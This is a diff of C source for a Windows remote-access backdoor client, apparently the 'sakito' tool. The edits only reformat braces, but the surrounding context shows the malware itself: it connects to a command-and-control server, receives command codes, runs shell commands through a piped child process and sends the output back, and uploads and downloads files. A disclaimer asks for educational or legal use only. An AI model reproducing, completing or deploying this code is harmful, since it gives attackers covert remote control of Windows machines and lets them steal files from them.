@@ -15,7 +15,8 @@ Use educationally/legally.
 #pragma comment(lib, "Ws2_32.lib")
 
 // Function to create connect socket.
-const SOCKET create_socket() {
+const SOCKET create_socket() 
+{
 	// Initialize winsock
 	WSADATA wsData;
 	WORD ver = MAKEWORD(2, 2);
@@ -34,7 +35,8 @@ const SOCKET create_socket() {
 }
 
 // Function to connect the connect socket to c2 server.
-int c2_connect(const SOCKET connect_socket) {
+int c2_connect(const SOCKET connect_socket) 
+{
 	// Create sokaddr_in structure.
 	struct sockaddr_in s_in;
 	s_in.sin_family = AF_INET;
@@ -42,7 +44,8 @@ int c2_connect(const SOCKET connect_socket) {
 	s_in.sin_port = htons(PORT);
 
 	// Connect to server hosting c2 service
-	if (connect(connect_socket, (SOCKADDR*)&s_in, sizeof(s_in)) == SOCKET_ERROR) {
+	if (connect(connect_socket, (SOCKADDR*)&s_in, sizeof(s_in)) == SOCKET_ERROR) 
+	{
 		closesocket(connect_socket);
 		return SOCKET_ERROR;
 	}
@@ -50,9 +53,11 @@ int c2_connect(const SOCKET connect_socket) {
 	return SUCCESS;
 }
 
-int send_pipe_output(HANDLE child_stdout_read, char* const buf, const SOCKET connect_socket) {
+int send_pipe_output(HANDLE child_stdout_read, char* const buf, const SOCKET connect_socket) 
+{
 	DWORD bytes_read; 
-	while (1) {
+	while (1) 
+	{
 		// Read stdout, stderr bytes from pipe.
 		ReadFile(child_stdout_read, buf, BUFLEN, &bytes_read, NULL);
 
@@ -76,7 +81,8 @@ int send_pipe_output(HANDLE child_stdout_read, char* const buf, const SOCKET con
 }
 
 // Function to execute command.
-int exec_cmd(const SOCKET connect_socket, char* const buf) {
+int exec_cmd(const SOCKET connect_socket, char* const buf) 
+{
 	HANDLE child_stdout_read;
 	HANDLE child_stdout_write;
 
@@ -100,11 +106,13 @@ int exec_cmd(const SOCKET connect_socket, char* const buf) {
 	return send_pipe_output(child_stdout_read, buf, connect_socket);
 }
 
-int ch_dir(char* const dir, const SOCKET connect_socket) {
+int ch_dir(char* const dir, const SOCKET connect_socket) 
+{
 	char chdir_result[] = "1";
 	_chdir(dir);
 
-	if (errno == ENOENT) {
+	if (errno == ENOENT) 
+	{
 		chdir_result[0] = '0';
 		errno = 0;
 	}
@@ -117,7 +125,8 @@ int ch_dir(char* const dir, const SOCKET connect_socket) {
 }
 
 // Function to receive file from client (TCP file transfer).
-int send_file(const SOCKET connect_socket, char* const buf) {
+int send_file(const SOCKET connect_socket, char* const buf) 
+{
 	// Default f_size value = -1
 	int32_t f_size = FAILURE;
 
@@ -125,9 +134,8 @@ int send_file(const SOCKET connect_socket, char* const buf) {
 	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_READ, OPEN_EXISTING);
 
 	// If File Exists.
-	if (h_file != INVALID_HANDLE_VALUE) {
+	if (h_file != INVALID_HANDLE_VALUE) 
 		f_size = sakito_win_fsize(h_file);
-	}
 
 	// Send read file bytes to server.
 	if (sakito_win_sendf(h_file, connect_socket, buf, f_size) < 1)
@@ -143,7 +151,8 @@ int send_file(const SOCKET connect_socket, char* const buf) {
 }
 
 // Function to receive file from client (TCP file transfer).
-int recv_file(const SOCKET connect_socket, char* const buf) {
+int recv_file(const SOCKET connect_socket, char* const buf) 
+{
 	HANDLE h_file = sakito_win_openf(buf+1, GENERIC_WRITE, CREATE_ALWAYS);
 
 	// Send file transfer start byte.
@@ -171,7 +180,8 @@ int recv_file(const SOCKET connect_socket, char* const buf) {
 	return i_result;
 }
 
-int send_cwd(char* const buf, const SOCKET connect_socket) {
+int send_cwd(char* const buf, const SOCKET connect_socket) 
+{
 	// Store working directory in buf.
 	GetCurrentDirectory(BUFLEN, buf);
 
@@ -183,8 +193,10 @@ int send_cwd(char* const buf, const SOCKET connect_socket) {
 }
 
 // Main function for connecting to c2 server & parsing c2 commands.
-int main(void) {
-	while (1) {
+int main(void) 
+{
+	while (1) 
+	{
 		// Create the connect socket.
 		const SOCKET connect_socket = create_socket();
 
@@ -193,17 +205,20 @@ int main(void) {
 		occurs (connection lost, etc) break the loop and reconnect & restart loop. The switch-
 		statement will parse & execute functions based on the order of probability.
 		*/
-		if (connect_socket != INVALID_SOCKET) {
+		if (connect_socket != INVALID_SOCKET) 
+		{
 			int i_result = c2_connect(connect_socket);
 
-			if (i_result) {
+			if (i_result) 
+			{
 				// 8192 == Max command line command length in windows + 1 for null termination.
 				char buf[BUFLEN+1] = { 0 };
 
 				init: // Receive initialization byte.
 				i_result = recv(connect_socket, buf, 1, 0);
 				
-				while (i_result > 0) {
+				while (i_result > 0) 
+				{
 					// Send current working directory to server.
 					if (send_cwd(buf, connect_socket) < 1)
 						break;
@@ -216,7 +231,8 @@ int main(void) {
 						break;
 
 					// buf[0] is the command code and buf+1 is pointing to the parsed data.
-					switch (buf[0]) {
+					switch (buf[0]) 
+					{
 						case '0':
 							i_result = exec_cmd(connect_socket, buf+1);
 							break;
